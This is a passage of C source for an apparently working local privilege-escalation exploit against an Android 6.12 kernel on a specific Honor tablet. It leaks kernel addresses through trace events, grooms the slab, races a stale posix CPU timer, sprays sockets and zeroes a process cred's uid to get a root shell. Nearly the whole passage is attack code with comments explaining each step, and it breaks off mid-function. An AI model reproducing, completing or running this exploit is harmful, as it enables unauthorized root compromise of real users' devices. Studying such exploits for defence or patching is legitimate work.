/*
 * CVE-2026-98260 - posix cpu timers: unprivileged uid-0 shell
 * Target : Honor MagicPad3 Pro 13.3 YLP-W00 / MagicOS 10.0.0,
 *          11.0.0.109 or 11.0.0.117(SP4)
 * Kernel : 6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k (verified)
 *          6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k (verified)
 *          6.12.58-android16-6-g142ddad31e60-abogki576095858-4k (static, 117)
 * SELinux: Enforcing
 * Patches: absent
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 * Status : EXP(root shell) - shell executes as uid 0 under SELinux
 *
 * Instead of pointing the task at a fake cred (exp.c), this stage modifies a
 * real cred in place.  A child execs this binary; the exec allocates a private
 * cred (cred_jar, bytes_req 0xb8, call-site low21 from the profile:
 * 0x19c474 on 11.0.0.109, 0x1935e4 on 11.0.0.117) which is leaked
 * from the kmem trace.  The child blocks on a pipe while the stale timer node
 * is reaped against a payload whose single rb_erase writes
 *
 *     [cred + 8] = 0          (uid/gid of the exec'd child)
 *
 * With cred->uid now 0, the child calls setuid(0): the kernel accepts it
 * without CAP_SETUID because kuid == old->uid, and sets euid/fsuid to 0.
 * cred == real_cred stays true, the SELinux blob stays valid, and execve of
 * /system/bin/sh copies the cred through the normal commit_creds path.
 *
 * The resulting task is uid 0 inside u:r:shell:s0 with the exec capability
 * fixup (bounding set only), so it owns root files by DAC but has no
 * CAP_DAC_OVERRIDE; it is not unrestricted system root.
 *
 * Default action prints id and the context; pass "shell" for an interactive
 * shell.  On any unverified state the process parks without reaping.  A
 * failed plant leaves a zombie behind; a keeper parent (lifecycle.h) and a
 * separate session keep it alive, and a closed stdout pipe cannot kill it.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/stat.h>

#include "vuln_precheck.h"
#include "trace_ids.h"
#include "lifecycle.h"

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3
#define PAGE 4096UL
#define SOCKBUF 8192
#define MAX_SOCKS 1024

#define STATIC_TIMER_SITE (cve98260_active_profile->timer_site)
#define TIMER_SITE_LOW21  (cve98260_active_profile->timer_low21)
#define TIMER_ALLOC       0x100ULL

#define CRED_SITE_LOW21 (cve98260_active_profile->cred_low21)
#define CRED_REQ        0xb8ULL
#define CRED_ALLOC      0xc0ULL

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct ev {
    unsigned type;
    int pid;
    unsigned long long site, ptr, req, alloc;
    unsigned long long pfn;
    unsigned order;
    unsigned long long gfp;
    unsigned long long tstamp;
};

struct child_report {
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static int g_held;

static void logf(const char *fmt, ...)
{
    va_list ap, ap2;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    if (cve_lifecycle_log_fd >= 0) {
        va_copy(ap2, ap);
        vdprintf(cve_lifecycle_log_fd, fmt, ap2);
        va_end(ap2);
    }
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
    if (cve_lifecycle_log_fd >= 0)
        (void)fsync(cve_lifecycle_log_fd);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o){unsigned v;memcpy(&v,b+o,4);return v;}
static unsigned long long u64(const unsigned char *b, size_t o){unsigned long long v;memcpy(&v,b+o,8);return v;}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs)/sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128]; size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) return -1;
    while (tot < cap) {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0) break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int parse_events(const unsigned char *b, size_t n, struct ev *out, int max)
{
    int cnt = 0;
    for (size_t base = 0; base + PAGE <= n; base += PAGE) {
        unsigned long long commit = u64(b, base + 8);
        unsigned long long ts = u64(b, base);
        size_t o = base + 16, end = base + 16 + commit;
        if (end > base + PAGE) end = base + PAGE;
        while (o + 4 <= end) {
            unsigned hdr = u32(b, o), tl = hdr & 31, td = hdr >> 5;
            size_t total; int data = 0;
            if (tl == 29) {
                if (!td) break;
                total = 4 + u32(b, o + 4);
                ts += ((unsigned long long)u32(b, o + 4) << 27) | td;
            } else if (tl == 30) {
                total = 8;
                ts = ((unsigned long long)u32(b, o + 4) << 27) | td;
            } else if (tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + u32(b, o + 4);
                data = 1;
                ts += td;
            } else {
                total = 4 + tl * 4;
                data = 1;
                ts += td;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 28 && p + 28 <= end && cnt < max) {
                unsigned type = u32(b, p) & 0xffff;
                if (type == EV_KMEM_CACHE_ALLOC || type == EV_KMALLOC) {
                    struct ev *e = &out[cnt++];
                    e->type = type;
                    e->tstamp = ts;
                    memcpy(&e->pid, b + p + 4, 4);
                    e->site = u64(b, p + 8);
                    e->ptr = u64(b, p + 16);
                    e->req = u64(b, p + 24);
                    e->alloc = u64(b, p + 32);
                } else if (type == EV_MM_PAGE_FREE || type == EV_MM_PAGE_ALLOC) {
                    struct ev *e = &out[cnt++];
                    e->type = type;
                    e->tstamp = ts;
                    memcpy(&e->pid, b + p + 4, 4);
                    e->pfn = u64(b, p + 8);
                    e->order = u32(b, p + 16);
                    e->gfp = u64(b, p + 24);
                }
            }
            if (total < 4) break;
            o += total;
        }
    }
    return cnt;
}

static unsigned long long calibrate_base(unsigned char *raw, struct ev *evs)
{
    unsigned long long hist[64] = {0}; int hcnt[64] = {0}; int hc = 0;
    unsigned long long recent[32] = {0}; int rn = 0;
    unsigned long long timer_site = 0;
    int made = 0;
    trace_start();
    for (int i = 0; i < 512; i++) {
        struct sigevent ev; timer_t t;
        memset(&ev, 0, sizeof(ev)); ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    long n = read_cpu(g_cpu, raw, 32u << 20);
    int c = n > 0 ? parse_events(raw, (size_t)n, evs, 300000) : 0;
    for (int i = 0; i < c; i++) {
        if (evs[i].type == EV_MM_PAGE_ALLOC && evs[i].order == 1) {
            if (rn < 32) recent[rn++] = evs[i].pfn;
            else {
                memmove(recent, recent + 1, 31 * sizeof(recent[0]));
                recent[31] = evs[i].pfn;
            }
        } else if (evs[i].type == EV_KMEM_CACHE_ALLOC &&
                   (evs[i].site & 0x1fffff) == TIMER_SITE_LOW21 && rn) {
            unsigned long long slab = evs[i].ptr & ~0x1fffULL;

            if (!timer_site)
                timer_site = evs[i].site;
            for (int j = 0; j < rn; j++) {
                unsigned long long b = slab - (recent[j] << 12);
                int f = 0;
                for (int k = 0; k < hc; k++)
                    if (hist[k] == b) { hcnt[k]++; f = 1; break; }
                if (!f && hc < 64) { hist[hc] = b; hcnt[hc] = 1; hc++; }
            }
        }
    }
    unsigned long long best = 0; int bestc = 0;
    for (int k = 0; k < hc; k++)
        if (hcnt[k] > bestc) { bestc = hcnt[k]; best = hist[k]; }
    logf("[base] made=%d best=%#llx count=%d\n", made, best, bestc);
    if (timer_site)
        logf("[base] timer_site=%#llx slide=%#llx\n",
               timer_site, timer_site - STATIC_TIMER_SITE);
    return bestc >= 4 ? best : 0;
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;
static int g_prefill_n;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++) {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
    g_prefill_n = n;
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE)) return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED) return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++) {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base; g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin(slot ? 3 : 1);
    while (!atomic_load(&g_go)) sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop)) {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid))) sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;) {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH) break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED) return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0) munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = { (char *)"", NULL };
    char *const envp[] = { NULL };
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1) _exit(117);
    if (read(g_ack_r, &ack, 1) != 1) _exit(118);

    for (int i = 0; i < NTIMERS; i++) {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t)) _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL)) _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid)) _exit(122);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS) sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range()) _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0) _exit(111);
    if (spawn_vm_helper(killer_fn) < 0) _exit(112);
    sigemptyset(&set); sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL)) _exit(114);
    for (;;) sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = { .tv_nsec = 10000000 };
    for (int i = 0; i < 400; i++) {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid) return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void park_forever(const char *why)
{
    logf("PARKED=1\n");
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

static void build_zero(unsigned char *buf, size_t off, unsigned long long S)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x10) = S;
}

#define SPRAY_THREADS 4
#define SPRAY_SOCKS 2048
static _Atomic int g_burst, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = { -1, -1, -1, -1, -1, -1, -1, -1 };

struct spray_arg {
    unsigned char *payload;
    int sock_first, sock_count, cpu;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++) {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap) {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * Non-destructive page-lifetime diagnostic.
 *
 * Allocate a full posix_timers_cache slab with ordinary CLOCK_MONOTONIC
 * timers, delete them (no exec failure, no stale timer), then watch the
 * freed order-1 slab pfn for 60 s.  This classifies whether an order-2
 * allocation that steals the page is short-lived or long-lived.
 */
static int page_lifetime_test(unsigned char *raw, struct ev *evs)
{
    timer_t *timers = calloc(PREFILL_TIMERS, sizeof(*timers));
    unsigned long long *ptrs = calloc(PREFILL_TIMERS, sizeof(*ptrs));
    struct sigevent sev;
    int nt = 0, np = 0;
    unsigned long long V = 0, target_pfn, slab_pfn;
    long n;
    int c;

    if (!timers || !ptrs)
        return 1;
    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_NONE;
    trace_start();
    for (; nt < PREFILL_TIMERS; nt++)
        if (timer_create(CLOCK_MONOTONIC, &sev, &timers[nt]))
            break;
    usleep(20000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 48u << 20);
    c = n > 0 ? parse_events(raw, (size_t)n, evs, 400000) : 0;
    for (int i = 0; i < c && np < PREFILL_TIMERS; i++)
        if (evs[i].type == EV_KMEM_CACHE_ALLOC &&
            evs[i].pid == (int)getpid() &&
            (evs[i].site & 0x1fffff) == TIMER_SITE_LOW21 &&
            evs[i].alloc == TIMER_ALLOC && evs[i].req == TIMER_ALLOC)
            ptrs[np++] = evs[i].ptr;
    for (int i = 0; i < np && !V; i++) {
        unsigned long long slab = ptrs[i] & ~0x1fffULL;
        int own = 0;

        for (int j = 0; j < np; j++)
            if ((ptrs[j] & ~0x1fffULL) == slab)
                own++;
        if (own == 32)
            V = ptrs[i];
    }
    if (!V) {
        logf("[-] pagelifetime: no full slab (timers=%d recs=%d)\n", nt, np);
        for (int i = 0; i < nt; i++)
            timer_delete(timers[i]);
        free(timers); free(ptrs);
        return 1;
    }
    target_pfn = (V - g_base) >> 12;
    slab_pfn = target_pfn & ~1ULL;
    logf("[page] V=%#llx pfn=%#llx slab=%#llx timers=%d recs=%d\n",
           V, target_pfn, slab_pfn, nt, np);

    ensure_raw();
    trace_start();
    for (int i = 0; i < nt; i++)
        timer_delete(timers[i]);
    free(timers); free(ptrs);

    long t0 = now_ms();
    int freed = 0;
    unsigned long long free_ts = 0, alloc_ts = 0, next_free_ts = 0;
    unsigned alloc_order = 0, next_free_order = 0;
    int free_cpu = -1, alloc_cpu = -1, next_free_cpu = -1;
    while (!freed && now_ms() - t0 < 60000) {
        for (int cpu = 0; cpu < 8 && !freed; cpu++) {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
            int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

            for (int j = 0; j < k; j++)
                if (evs[j].type == EV_MM_PAGE_FREE && evs[j].order == 1 &&
                    evs[j].pfn == slab_pfn) {
                    freed = 1;
                    free_ts = evs[j].tstamp;
                    free_cpu = cpu;
                    break;
                }
        }
        if (!freed)
            usleep(1000);
    }
    logf("[page] freed=%d after %ldms free_ts=%llu cpu=%d\n",
           freed, now_ms() - t0, free_ts, free_cpu);
    if (!freed) {
        trace_stop();
        return 1;
    }

    /*
     * A movable anonymous fault is the direct pageblock-type probe: if the
     * freed slab page is in a MOVABLE pageblock, this large fault stream
     * should eventually allocate the target pfn (possibly order-0).
     */
    {
        size_t alen = 256UL << 20;
        unsigned char *ap = mmap(NULL, alen, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

        if (ap != MAP_FAILED) {
            logf("[page] anon_touch len=%zu\n", alen);
            for (size_t i = 0; i < alen; i += PAGE)
                ap[i] = 1;
        }
    }
    /*
     * Reclaimable-slab probe: dentry/inode objects are charged to
     * SLAB_RECLAIM_ACCOUNT, so their slab pages come from RECLAIMABLE
     * pageblocks.  If the target page lives in such a pageblock, this file
     * storm should be able to allocate it.
     */
    {
        int made = 0, fd;
        char path[128];

        (void)mkdir("/data/local/tmp/pgspray", 0700);
        for (int i = 0; i < 20000; i++) {
            snprintf(path, sizeof(path), "/data/local/tmp/pgspray/f%05d", i);
            fd = open(path, O_CREAT | O_RDWR, 0600);
            if (fd < 0)
                break;
            close(fd);
            made++;
        }
        logf("[page] dentry_spray files=%d\n", made);
    }
    t0 = now_ms();
    while (now_ms() - t0 < 60000) {
        for (int cpu = 0; cpu < 8; cpu++) {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
            int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

            for (int j = 0; j < k; j++) {
                if (evs[j].type == EV_MM_PAGE_ALLOC &&
                    (evs[j].pfn == slab_pfn || evs[j].pfn == target_pfn)) {
                    if (!alloc_ts) {
                        alloc_ts = evs[j].tstamp;
                        alloc_order = evs[j].order;
                        alloc_cpu = cpu;
                        logf("[page] alloc order=%u pfn=%#llx gfp=%#llx "
                               "dt_ns=%lld cpu=%d\n",
                               evs[j].order, evs[j].pfn, evs[j].gfp,
                               (long long)(alloc_ts - free_ts), cpu);
                    }
                } else if (evs[j].type == EV_MM_PAGE_FREE &&
                           (evs[j].pfn == slab_pfn ||
                            evs[j].pfn == target_pfn)) {
                    if (!next_free_ts) {
                        next_free_ts = evs[j].tstamp;
                        next_free_order = evs[j].order;
                        next_free_cpu = cpu;
                        logf("[page] next_free order=%u pfn=%#llx "
                               "dt_alloc_ns=%lld cpu=%d\n",
                               evs[j].order, evs[j].pfn,
                               (long long)(next_free_ts - alloc_ts), cpu);
                    }
                }
            }
        }
        usleep(1000);
    }
    logf("[page] done alloc=%llu next_free=%llu\n",
           alloc_ts, next_free_ts);
    trace_stop();
    return 0;
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    pin(a->cpu);
    while (!atomic_load(&g_burst))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < 8000) {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

struct plant_res { unsigned long long V, A, slab_pfn; int ok; };

static void run_plant(unsigned long long target, int tag,
                      struct plant_res *res, unsigned char *raw, struct ev *evs)
{
    int ready_p[2], ack_p[2], tid_p[2];
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p)) {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    pid_t T = fork();
    if (T < 0) {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T == 0) {
        close(ready_p[0]); close(ack_p[1]); close(tid_p[0]);
        g_ready_w = ready_p[1]; g_ack_r = ack_p[0]; g_tid_w = tid_p[1];
        run_target();
        _exit(115);
    }
    close(ready_p[1]); close(ack_p[0]); close(tid_p[1]);
    char ch;
    if (read(ready_p[0], &ch, 1) != 1) {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    siginfo_t si;
    if (wait_zombie(T, &si)) {
        logf("[-] plant%d no zombie; holding child\n", tag);
        trace_stop();
        kill(T, SIGKILL);
        g_held++;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
           tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED) {
        trace_stop();
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        g_held++;
        return;
    }

    long n = read_cpu(g_cpu, raw, 48u << 20);
    int c = n > 0 ? parse_events(raw, (size_t)n, evs, 400000) : 0;
    unsigned long long V = 0, site0 = 0;
    int nrec = 0;
    for (int i = 0; i < c; i++) {
        if (evs[i].type == EV_KMEM_CACHE_ALLOC && evs[i].pid == etid &&
            (evs[i].site & 0x1fffff) == TIMER_SITE_LOW21 &&
            evs[i].alloc == TIMER_ALLOC && evs[i].req == TIMER_ALLOC) {
            if (nrec == 0) site0 = evs[i].site;
            if (nrec == VICTIM_IDX) V = evs[i].ptr;
            nrec++;
        }
    }
    if (!V || !site0) {
        trace_stop();
        logf("[-] plant%d victim not captured; holding zombie\n", tag);
        g_held++;
        return;
    }
    unsigned long long slide = site0 - STATIC_TIMER_SITE;
    unsigned long long pfn = (V - g_base) >> 12;
    unsigned long long slab_pfn = pfn & ~1ULL;
    int free_seen = 0;
    for (int i = 0; i < c; i++)
        if (evs[i].type == EV_MM_PAGE_FREE && evs[i].order == 1 && evs[i].pfn == slab_pfn)
            free_seen = 1;
    unsigned long long vslab = V & ~0x1fffULL;
    int slab_own = 0;
    for (int i = 0; i < c; i++)
        if (evs[i].type == EV_KMEM_CACHE_ALLOC && evs[i].pid == etid &&
            (evs[i].site & 0x1fffff) == TIMER_SITE_LOW21 &&
            evs[i].alloc == TIMER_ALLOC && evs[i].req == TIMER_ALLOC &&
            (evs[i].ptr & ~0x1fffULL) == vslab)
            slab_own++;
    logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx free_seen=%d recs=%d slab_own=%d/32\n",
           tag, V, V + 0x78, pfn, slab_pfn, slide, free_seen, nrec, slab_own);

    size_t off = (size_t)((V & 0x1fff) + 0x78);
    unsigned char *payload = malloc(SOCKBUF);
    if (!payload) park_forever("payload alloc failed");
    build_zero(payload, off, target);

    ensure_pool();
    ensure_raw();
    atomic_store(&g_burst, 0);
    atomic_store(&g_stop_spray, 0);
    /*
     * Tracing has stayed on since the timer window started, so a free that
     * happens while the timer trace is parsed is still recorded.  Poll fast:
     * a freed order-1 page is easy for any other allocation to take.
     */
    long t0 = now_ms();
    while (!free_seen && now_ms() - t0 < 15000) {
        for (int cpu = 0; cpu < 8 && !free_seen; cpu++) {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
            int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

            for (int j = 0; j < k; j++)
                if (evs[j].type == EV_MM_PAGE_FREE && evs[j].order == 1 &&
                    evs[j].pfn == slab_pfn)
                    free_seen = 1;
        }
        if (!free_seen)
            usleep(1000);
    }
    if (!free_seen) {
        for (int cpu = 0; cpu < 8 && !free_seen; cpu++) {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
            int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

            for (int j = 0; j < k; j++)
                if (evs[j].type == EV_MM_PAGE_FREE && evs[j].order == 1 &&
                    evs[j].pfn == slab_pfn)
                    free_seen = 1;
        }
    }
    logf("[+] plant%d free_seen=%d after %ldms\n", tag, free_seen, now_ms() - t0);
    if (!free_seen) {
        trace_stop();
        logf("[-] plant%d victim slab not freed; holding zombie\n", tag);
        g_held++;
        return;
    }

    atomic_store(&g_burst, 1);
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int per = g_pool_n / SPRAY_THREADS;

    for (int i = 0; i < SPRAY_THREADS; i++) {
        args[i].payload = payload;
        args[i].sock_first = i * per;
        args[i].sock_count = per;
        args[i].cpu = 3 + i;
        pthread_create(&th[i], NULL, spray_thread, &args[i]);
    }
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 3000) {
        for (int cpu = 0; cpu < 8 && !hit; cpu++) {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
            int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

            for (int j = 0; j < k; j++)
                if (evs[j].type == EV_MM_PAGE_ALLOC && evs[j].order == 1 &&
                    evs[j].pfn == slab_pfn && (evs[j].gfp & 0x400000ULL))
                    hit = 1;
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++) {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
        int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

        for (int j = 0; j < k; j++)
            if (evs[j].type == EV_MM_PAGE_ALLOC && evs[j].order == 1 &&
                evs[j].pfn == slab_pfn && (evs[j].gfp & 0x400000ULL))
                hit = 1;
    }
    logf("[+] plant%d burst hit=%d after %ldms\n", tag, hit, now_ms() - t1);
    if (!hit) {
        logf("[-] plant%d burst missed; holding zombie\n", tag);
        g_held++;
        return;
    }

    usleep(1000);
    int st = 0;
    waitpid(T, &st, 0);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->V = V; res->A = V + 0x78; res->slab_pfn = slab_pfn; res->ok = 1;
    free(payload);
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw, struct ev *evs,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode)
{
    for (int attempt = 0; attempt < 4; attempt++) {
        int go[2], st[2];
        pid_t p;
        long n;
        int c, hello = 0;
        unsigned long long R = 0, site = 0;

        if (pipe(go) || pipe(st))
            return 0;
        p = fork();
        if (p == 0) {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
